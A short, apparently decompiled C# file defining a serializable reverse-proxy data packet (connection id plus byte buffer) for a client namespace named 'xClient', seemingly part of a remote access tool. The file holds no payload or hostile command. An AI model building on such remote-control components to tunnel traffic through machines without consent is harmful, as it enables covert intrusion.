using System;

namespace xClient.Core.ReverseProxy.Packets;

[Serializable]
public class ReverseProxyData : GInterface4
{
	public int ConnectionId { get; set; }

	public byte[] Data { get; set; }

	public ReverseProxyData()
	{
	}

	public ReverseProxyData(int connectionId, byte[] data)
	{
		ConnectionId = connectionId;
		Data = data;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
